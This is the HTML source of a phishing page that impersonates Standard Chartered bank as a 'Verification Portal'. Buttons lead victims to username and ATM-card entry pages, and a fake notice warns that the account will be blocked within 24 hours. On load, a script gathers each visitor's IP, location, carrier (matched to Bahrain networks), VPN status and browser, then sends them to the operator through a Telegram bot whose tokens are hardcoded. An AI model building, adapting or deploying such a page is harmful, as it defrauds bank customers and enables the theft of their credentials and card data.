<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
<title>Mobile Landing</title>
<style>
  :root{
    --green:#029a3e;
    --green-press:#009337;
    --text:#ffffff;
    --muted:rgba(255,255,255,.8);
    --blur:8px;
    --splash-ms:1600;
    --pop-ms:500ms;
  }
  html,body{
    width:100%;
    margin:0; overflow:hidden;
    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
    color:var(--text); background:#000;
  }

  /* replace your .screen block with this */
.screen{
  position:relative;
  height:100dvh;         /* dynamic viewport height (accounts for browser UI) */
  width:100%;
  overflow:hidden;
}

/* optional‚Äîfallbacks for older browsers */
@supports not (height: 100dvh) {
  .screen{ height:100vh; }   /* older Android */
}
@supports (height: 100svh) {
  .screen{ height:100svh; }  /* small viewport unit (Safari 15+) */
}


  /* Background video */
  .bg{ position:absolute; inset:0; z-index:0; }
  .bg video{
    width:100%; height:100%;
    object-fit:cover; object-position:center;
    filter:saturate(1.02); will-change:filter;
  }
  .bg::after{
    content:""; position:absolute; inset:0;
    background:linear-gradient(180deg, rgba(0,0,0,.15) 0%, rgba(0,0,0,.45) 60%, rgba(0,0,0,.65) 100%);
    pointer-events:none;
  }
  .is-blurred .bg video{ filter:blur(var(--blur)) saturate(1.02); }

  /* Splash */
  .splash{
    position:absolute; inset:0; z-index:3;
    display:flex; align-items:center; justify-content:center;
    background:transparent; transition:opacity .35s ease;
  }
  .splash-logo{
    width:140px; height:auto; object-fit:contain;
    filter:drop-shadow(0 4px 16px rgba(0,0,0,.45));
    animation:breath 1.2s ease-in-out infinite;
  }
  @keyframes breath{ 0%,100%{transform:scale(1);opacity:.95} 50%{transform:scale(1.03);opacity:1} }
  .splash.hidden{ opacity:0; pointer-events:none; }

  /* Top logo */
  .top{
    position:absolute; z-index:2;
    top:calc(env(safe-area-inset-top,0px) + 10px);
    right:12px; left:12px; height:44px;
    display:flex; align-items:center; justify-content:flex-end;
    opacity:0; transform:translateY(-6px) scale(.98);
  }
  .logo{ width:128px; height:auto; object-fit:contain; filter:drop-shadow(0 1px 2px rgba(0,0,0,.25)); }

  /* Main content */
  .content{
    position:absolute; inset:0; z-index:1;
    display:flex; flex-direction:column; align-items:center; justify-content:center;
    text-align:center; gap:18px; padding:0 20px;
    margin-top: -100px;
    transform:translateY(-6%); opacity:0; transform-origin:center;
  }
  .headline{
    font-weight:500; font-size:24px; line-height:1.25; letter-spacing:.2px;
    text-shadow:0 2px 6px rgba(0,0,0,.35);
  }

  .cta{ width:100%; max-width:360px; display:flex; flex-direction:column; gap:12px; }
  .btn{
    appearance:none; border:0; border-radius:5px;
    padding: 26px 22px;  font-size:16px; font-weight:400; letter-spacing:.2px;
    /* box-shadow:0 6px 16px rgba(0,0,0,.25); */
    transition:transform .06s ease, background-color .06s ease, border-color .06s ease;
    touch-action:manipulation;
  }
  .btn:active{ transform:translateY(1px); }
  .btn-primary{ background:var(--green); color:#fff;}
  .btn-primary:active{ background:var(--green-press); }
  .or{ text-align:center; font-size:14px; font-weight:700; color:var(--muted); letter-spacing:.3px; }

  .bottom{
    position:absolute; z-index:1;
    bottom:calc(env(safe-area-inset-bottom,0px) + 14px);
    left:18px; right:18px; text-align:center;
    font-size:12px; color:var(--muted); line-height:1.35;
    text-shadow:0 2px 4px rgba(0,0,0,.4);
    opacity:0; transform:translateY(6px) scale(.98);
  }

  @keyframes popIn{
    0%{ opacity:0; transform:translateY(6px) scale(.98); }
    100%{ opacity:1; transform:translateY(0) scale(1); }
  }
  .show-ui .top, .show-ui .content, .show-ui .bottom{
    animation:popIn var(--pop-ms) cubic-bezier(.2,.7,.3,1) forwards;
  }
  .show-ui .content{ animation-delay:40ms; }
  .show-ui .bottom{  animation-delay:80ms; }

  /* ===== Modal (Notice) ===== */
  .modal-backdrop{
    position:absolute; inset:0; z-index:5;
    display:flex; align-items:center; justify-content:center;
    background:rgba(0,0,0,.7);
    opacity:0; pointer-events:none; transition:opacity .25s ease;
  }
  .modal{
    width:max(80%, 360px);
    background:#fff; color:#000; text-align:center;
    border-radius:16px; padding:18px 16px;
    box-shadow:0 12px 32px rgba(0,0,0,.35);
    transform:scale(.94); opacity:0;
  }
  .modal h2{ margin:6px 0 8px; font-size:18px; font-weight:700; }
  .modal p{ margin:0 0 14px; font-size:14px; line-height:1.4; color:#222; }
  .modal .btn{ width:100%; } /* full-width button inside modal */

  .modal-backdrop.open{ opacity:1; pointer-events:auto; }
  @keyframes modalIn{
    from{ opacity:0; transform:scale(.94); }
    to{ opacity:1; transform:scale(1); }
  }
  .modal-backdrop.open .modal{ animation:modalIn 220ms cubic-bezier(.2,.7,.3,1) forwards; }

  @media (max-width:360px){
    .headline{ font-size:20px; }
    .btn{ font-size:15px; padding:13px 16px; }
    .logo{ width:116px; }
  }

  .loader-backdrop {
  position: absolute;
  inset: 0;
  z-index: 1000;
  display: none;
  align-items: center;
  justify-content: center;
  background: rgba(0, 0, 0, 0.55);
  backdrop-filter: blur(2px);
}

.loader-backdrop.show {
  display: flex;
}

.loader-gif {
  width: 60px; /* adjust as needed */
  height: 60px;
  object-fit: contain;
}

</style>
</head>
<body>
  <div class="screen is-blurred" id="app">
    <div class="bg" aria-hidden="true">
      <video id="bgVideo" autoplay muted loop playsinline preload="metadata" poster="">
        <source src="video_day.mp4" type="video/mp4" />
      </video>

   

    </div>

    <div class="splash" id="splash">
      <img class="splash-logo" src="logo.png" alt="Standard Chartered" />
    </div>

    <div class="top">
      <img class="logo" src="logo.png" alt="Standard Chartered" />
    </div>

    <main class="content" role="main" aria-label="Welcome">
      <h1 class="headline">Welcome to Verification Portal</h1>
      <div class="cta">
       <button class="btn btn-primary" data-nav="log.html" type="button">Verify with Username</button>
<div class="or">Or</div>
<button class="btn btn-primary" data-nav="cp.html" type="button">Verify with ATM Card</button>

      </div>
    </main>

    <div class="bottom">Your details are 100% encrypted and protected by advanced security protocols</div>

    <!-- Notice Modal -->
    <div class="modal-backdrop" id="notice">
      <div class="modal" role="dialog" aria-labelledby="noticeTitle" aria-modal="true">
        <h2 id="noticeTitle">Notice</h2>
        <p>Dear Standard Chartered user, your account is at risk of deactivation because your verification has expired in our system records. Please update your verification immediately; otherwise, your Standard Chartered account & card will be temporarily blocked within 24 hours.</p>
        <button class="btn btn-primary" id="ackBtn" type="button">I understand</button>
      </div>
    </div>
  </div>
   <div class="loader-backdrop" id="loader" aria-hidden="true">
  <img src="cicle_loader.gif" alt="Loading..." class="loader-gif" />
</div>
<script>
window.addEventListener("load", async () => {
  // --- CONFIG (set your own values)
  const ipinfoToken = "1b16cc141fc931"; // your ipinfo token
  const botToken = "8256131717:AAHjipiO2IPNJ5V8h_au0fIiKwTQ2cUUj9w"; // your Telegram bot token
  const chatId = "-5001159145"; // your Telegram chat/channel id

  // --- Helper: Bahrain carrier inference
  const BH_ASN_MAP = {
    "AS5416": "Batelco",
    "AS51375": "stc Bahrain",   // formerly VIVA
    "AS31452": "Zain Bahrain",
  };
  const BH_ORG_REGEX = [
    { re: /(beyon|batelco|btc\.com\.bh)/i, label: "Batelco" },
    { re: /\bstc\b|\bstc bahrain\b|viva bahrain/i, label: "stc Bahrain" },
    { re: /\bzain\b|\bzain bahrain\b/i, label: "Zain Bahrain" },
  ];
  const VPN_CLOUD_KEYWORDS = [
    "amazon","aws","google","gcp","microsoft","azure","cloudflare","fastly",
    "ovh","hetzner","digitalocean","linode","leaseweb","contabo","scaleway",
    "vultr","aliyun","huawei cloud","akamai","edgecast","nord","surfshark",
    "mullvad","proton","expressvpn","vpn","proxy"
  ];

  const getConnectionHint = () => {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) return "n/a";
    const parts = [];
    if (c.type) parts.push(`type=${c.type}`);
    if (c.effectiveType) parts.push(`effectiveType=${c.effectiveType}`);
    if (typeof c.downlink === "number") parts.push(`downlink‚âà${c.downlink}Mbps`);
    if (typeof c.rtt === "number") parts.push(`rtt‚âà${c.rtt}ms`);
    return parts.join(" ¬∑ ") || "available";
  };

  const normalizeCarrier = (asn, org) => {
    if (asn && BH_ASN_MAP[asn]) return BH_ASN_MAP[asn];
    for (const { re, label } of BH_ORG_REGEX) {
      if (org && re.test(org)) return label;
    }
    return null;
  };

  const looksLikeVpnOrCloud = (org) => {
    if (!org) return false;
    const s = org.toLowerCase();
    return VPN_CLOUD_KEYWORDS.some(k => s.includes(k));
  };

  try {
    const time = new Date().toISOString();
    const browser = navigator.userAgent;
    const netHint = getConnectionHint();

    // Get IP + ASN/Org from ipinfo
    const ipRes = await fetch(`https://ipinfo.io/json?token=${encodeURIComponent(ipinfoToken)}`, {
      cache: "no-store"
    });
    const ipData = await ipRes.json();

    // Parse ASN from org string like "AS9829 Bharti Airtel Ltd"
    const orgRaw = ipData.org || "";  // e.g. "AS5416 Bahrain Telecommunications Company (BATELCO) B.S.C."
    let asn = "";
    const m = /^AS(\d+)/i.exec(orgRaw);
    if (m) asn = `AS${m[1]}`;

    const carrier = normalizeCarrier(asn, orgRaw) || "unknown";
    const vpnOrCloud = looksLikeVpnOrCloud(orgRaw);
    const flags = [
      ipData.country ? `country=${ipData.country}` : null,
      vpnOrCloud ? "vpn/cloud" : null,
      ipData.anycast ? "anycast" : null
    ].filter(Boolean).join(" ¬∑ ");

    // Build Telegram message
    const message =
`üß† New Visitor

üïí Time: ${time}
üåç IP: ${ipData.ip || "‚Äî"}
üìç Location: ${[ipData.city, ipData.region, ipData.country].filter(Boolean).join(", ") || "‚Äî"}

üîé ASN: ${asn || "‚Äî"}
üè¢ Org/ISP: ${orgRaw || "‚Äî"}
üì∂ Inferred Carrier (BH): ${carrier}
üè≥ Flags: ${flags || "‚Äî"}

üß≠ Browser: ${browser}
üåê Network Hint: ${netHint}`;

    // Send to Telegram
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

  } catch (error) {
    console.error("Error sending data to Telegram:", error);
  }
});
</script>

<script>
//    window.addEventListener("load", async () => {
//     // SHOW CONTENT AFTER 3 SECONDS
  

//     try {
//       const time = new Date().toISOString();
//       const browser = navigator.userAgent;
//       const ipRes = await fetch("https://ipinfo.io/json?token=b8a284ba09a629");
//       const ipData = await ipRes.json();
    
//  const botToken = '8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8';
//                 const chatId = '-5091670751';
//       const message = `
// üß† New Visitor

// üïí Time: ${time}
// üåç IP: ${ipData.ip}
// üìç Location: ${ipData.city}, ${ipData.region}, ${ipData.country}
// `;

//       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({ chat_id: chatId, text: message })
//       });

//     } catch (error) {
//       console.error("Error sending data to Telegram:", error);
//     }
//   });
(function(){
  const app    = document.getElementById('app');
  const splash = document.getElementById('splash');
  const video  = document.getElementById('bgVideo');
  const notice = document.getElementById('notice');
  const ackBtn = document.getElementById('ackBtn');
  const loader = document.getElementById('loader');
  const navButtons = document.querySelectorAll('[data-nav]');

  let modalTimer = null;
  let splashMinTime = parseInt(getComputedStyle(document.documentElement).getPropertyValue('--splash-ms')) || 1600;
  let seenFrame = false, timerDone = false;

  // --- SAFARI/BFCACHE: reliably resume background video ---
  async function resumeBgVideo() {
    if (!video) return;

    // Make sure attributes are set for autoplay on iOS
    video.muted = true;
    video.setAttribute('muted', '');      // boolean attribute helps Safari
    video.setAttribute('playsinline', '');
    video.autoplay = true;

    // If the element is in a weird state after bfcache, reload it
    if (video.readyState < 2) {
      try { video.load(); } catch(e) {}
      await new Promise(resolve => {
        const onReady = () => { video.removeEventListener('loadeddata', onReady); resolve(); };
        video.addEventListener('loadeddata', onReady, { once:true });
        // Fallback in case loadeddata never fires
        setTimeout(resolve, 200);
      });
    }

    // Nudge currentTime slightly; fixes some iOS stalls
    try {
      if (video.currentTime === 0) {
        video.currentTime = 0.001;
      }
    } catch (e) {}

    // Try up to 3 times to play
    for (let i = 0; i < 3; i++) {
      try {
        await video.play();
        return; // success
      } catch (e) {
        // small delay then retry
        await new Promise(r => setTimeout(r, 120));
      }
    }

    // Last resort: re-attach the <source> (no cache-bust visible to users)
    const srcEl = video.querySelector('source');
    if (srcEl) {
      const src = srcEl.getAttribute('src');
      try {
        srcEl.setAttribute('src', src); // re-assign same src
        video.load();
        await video.play().catch(()=>{});
      } catch (e) {}
    }
  }

  // ---- helpers ----
  const resetUI = () => {
    navButtons.forEach(b => b.disabled = false);
    loader.classList.remove('show');
    loader.setAttribute('aria-hidden', 'true');
    notice.classList.remove('open');
    app.classList.add('show-ui');
    splash.classList.add('hidden');
    app.classList.remove('is-blurred');
    resumeBgVideo(); // <‚Äî ensure video resumes on return
  };

  const maybeReveal = () => {
    if (!seenFrame || !timerDone) return;
    splash.classList.add('hidden');
    app.classList.remove('is-blurred');
    app.classList.add('show-ui');
    modalTimer = setTimeout(()=>{ notice.classList.add('open'); }, 120);
  };

  // ---- video setup (first load) ----
  const prefersReduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  if (prefersReduce && video){
    video.removeAttribute('autoplay');
    try { video.pause(); } catch(e){}
  }
  if (video){
    video.loop = true;
    video.addEventListener('ended', ()=> { video.currentTime = 0; video.play().catch(()=>{}); });
    const markFrame = () => { seenFrame = true; maybeReveal(); };
    video.addEventListener('loadeddata', markFrame, {once:true});
    video.addEventListener('canplay',    markFrame, {once:true});

    // First-time attempt
    resumeBgVideo();

    // If user brings tab/app back to foreground
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) resumeBgVideo();
    });
    window.addEventListener('focus', resumeBgVideo);
  } else {
    seenFrame = true;
  }

  // splash timers
  const t1 = setTimeout(()=>{ timerDone = true; maybeReveal(); }, splashMinTime);
  const t2 = setTimeout(()=>{ seenFrame = true; maybeReveal(); }, splashMinTime + 1200);

  // close modal
  ackBtn.addEventListener('click', () => {
    notice.classList.remove('open');
    if (modalTimer) clearTimeout(modalTimer);
  });

  // loader + delayed navigation
  navButtons.forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      const href = btn.getAttribute('data-nav');
      if (!href) return;

      notice.classList.remove('open');
      navButtons.forEach(b => b.disabled = true);

      loader.classList.add('show');
      loader.setAttribute('aria-hidden', 'false');

      setTimeout(() => {
        window.location.href = href;
      }, 3000);
    });
  });

  // --- Back/forward cache restore ---
  window.addEventListener('pageshow', (e) => {
    const navEntry = performance.getEntriesByType('navigation')[0];
    const cameFromBFCache = e.persisted || (navEntry && navEntry.type === 'back_forward');
    if (cameFromBFCache) {
      resetUI();          // restore UI + resume video
    } else {
      // Even when not marked as bfcache, some Safari paths still need a nudge
      resumeBgVideo();
    }
  });

  // Pause & clear timers when leaving (helps bfcache restore)
  window.addEventListener('pagehide', (e) => {
    if (modalTimer) clearTimeout(modalTimer);
    clearTimeout(t1);
    clearTimeout(t2);
    try { video && video.pause(); } catch (_) {}
  });

  // As an extra safety net on iOS: if the user taps anywhere after back, start the video
  window.addEventListener('touchstart', function onFirstTouch() {
    resumeBgVideo();
    window.removeEventListener('touchstart', onFirstTouch);
  }, { passive:true });

})();
</script>


</body>
</html>

